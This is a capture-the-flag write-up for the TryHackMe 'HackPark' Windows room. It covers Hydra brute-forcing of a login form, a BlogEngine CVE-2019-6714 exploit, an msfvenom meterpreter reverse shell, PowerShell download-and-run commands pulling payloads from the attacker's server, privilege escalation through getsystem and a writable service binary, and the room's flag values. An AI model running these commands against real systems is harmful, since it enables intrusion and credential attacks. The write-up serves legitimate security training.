# Lab Report - HackPark


# Overview 
- **Difficulty**: Medium 
- **Platform**: Windows
- **Link**: https://tryhackme.com/room/hackpark

## Challenge Description 
>**Brute-force a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

## Resolution Summary 
**We discovered available services with an ``Nmap`` scan, revealing an HTTP web application and an RDP service. We intercepted the login request with ``Burp Suite ``and brute-forced the credentials with ``Hydra``. Once logged in, we identified the CMS as ``BlogEngine`` 3.3.6.0 and exploited it using a public Directory Traversal / RCE exploit (``CVE-2019-6714``) to obtain a reverse shell. We then upgraded it to a ``Meterpreter`` session and escalated our privileges to SYSTEM via ``getsystem``, a world-writable service binary, and ``WinPEAS``.**

# Information Gathering 
- **Since we were given an IP address when starting the assessment,  we started by performing an `Nmap` scan in order to map the network architecture and find out which services were available. We also scanned for their versions to potentially reveal low-hanging fruit (version-related exploits).** 
```bash
sudo nmap -sV 10.10.175.162
```

- **However, when we ran this scan, the host appeared as down. Hence, we added the `-Pn` flag in order to skip host discovery and assume that the host is alive.** 
```bash
sudo nmap -sV -Pn 10.10.175.162
```
	- Note: Addin the -p- flag resulted in an endless scan (interrupted).

- **The scan revealed the following results:** 
```bash
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- **The output revealed a Windows RDP listening on `port 3389`. We focused on the web application first in hope to find credentials and then comprise the RDP service.**
## HTTP (80)
- **When visiting the web page, we observed a picture of the infamous `Pennywise` (first flag) from  'IT', written by Stephen King.** 

- **Nothing stood out from inspecting the web application and the Source page, except for the login portal, which we can attempt to brute-force.** 

- **First, we wanted to inspect the login request. For that purpose, we used Burp Suite to intercept one and inspect it with the Repeater module.**
- **Once we identified the relevant fields, we attempted a brute force attack using `Hydra`:
```bash
hydra -l admin -P /home/kali/Downloads/rockyou.txt 10.10.164.221 http-post-form '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=w8EJbM6L2oQPkEK0WitmXoIPrfSpbm1n1lSOJ9RXNVbQzDqOPOvxb7HFl%2BCtP6jT5489sybaEaCfEbuaCYGvtyK0%2F94SjPIgqqQ7b%2Bdq3bgszLEx8zNI8rpbSLb%2B1wgSBIw1mEG2ScXyHz4w2sT9f9R06S30zmKL%2F3niwA5djJALT8ba&__EVENTVALIDATION=wAbd3ZuBTfc5PWr6OYw5Lq4EWJ%2FQahVpr99vgufwt5FXD30%2F%2B9HKHZfNClSgfkyHy0U4dsKUPrgEJm%2FDcX3u8Ull2OKB0IzXM6lCnbMpC9sEPl1YbAfdfEKSJniGiNX75DKQCa4CA7Z7ZRa7EnbIALATnI19kZbsrvBgFPMcfTxNibEY&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'
```
	- Important Note: Keep the request you intercepted (and from which you took the previous fields) on hold, don't forward it before getting the result of the brute force attack. 

# Exploitation 
- **Once we got access to the administrator dashboard, we started by looking if there was any vulnerability tied to the software's version, which was : `blogengine 3.3.6.0`.**
- **We found a Directory Traversal / RCE exploit available : `CVE-2019-6714`.**

- **First, we set a listener on our device:**
```bash
nc -lnvp 4445
```

- **Next, we uploaded the exploit in `http://10.10.216.172/admin/app/editor/editpost.cshtml` then we accessed `10.10.216.172/?theme=../../App_Data/files` to trigger it.** 
- **We finally obtained a shell.** 

# Privilege Escalation 
- **First things first, we upgraded our current shell into a meterpreter one.**
- **We started by generating a payload with `msfvenom`:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp  LHOST=10.11.139.102 LPORT=1234 -f exe -o shell.exe
```

- **Next, we hosted a python HTTP server to make it available to the target:**
```bash
python3 -m http.server 8000
```

- **After that, we set up a handler on Metasploit:**
```bash
msfconsole
use /multi/handler
#set options ...
#set payload
run
```

- **We uploaded the payload on the target by using the following:**
```powershell
#On the target (current reverse shell)
powershell -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.11.139.102:8000/shell.exe','C:\\Users\\Public\\shell.exe')"

shell.exe
```

- **With our meterpreter shell, we started by gathering information on the system:**
```meterpreter
sysinfo
```

## Privesc Vector 1
- **From there, we can directly gain SYSTEM privileges with the following built-in Meterpreter command:**
```meterpreter
getsystem
```

## Privesc Vector 2
- **Next, we tried to find a services that was running an automated task, which we could easily exploit:** 
```bash
ps 
```

- **We found a binary named `Message.exe` which seems suspicious, we wanted to further investigate it.** 
- **We can see what are the permissions over this executable:**
```cmd
#To switch to a cmd shell
shell 

icacls Message.exe
```

- **We found that it was world-writable, meaning that we could overwrite it with a shell.** 
- **But before that, we needed to stop the service, then we could overwrite the binary and restart the service so it is executed.** 
```cmd
taskkill /PID 2420 /F

echo @echo off > Message.exe
echo start cmd.exe > Message.exe

Message.exe
```

## Privesc Vector 3
- **We could also use `Winpeas` in order to perform privilege escalation.** 
- **We used the same technique as previously to upload the executable on the target machine:** 
```powershell
powershell -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.11.139.102:8000/winPEASx64.exe','C:\\Users\\Public\\Winpeas.exe')"
```

- **Then, we ran it with:**
```bash
Winpeas.exe
```

# Trophy 
**User.txt → `759bd8af507517bcfaede78a21a73e39`  

**Root.txt → `7e13d97f05f7ceb9881a3eb3d78d3e72`**

# Lessons Learned
- **To run PowerShell commands from cmd, use : `powershell -NoProfile -Command [enter your command]`.**
- **When having a Meterpreter shell, using `getsystem` can allow you to easily elevate your privileges.** 
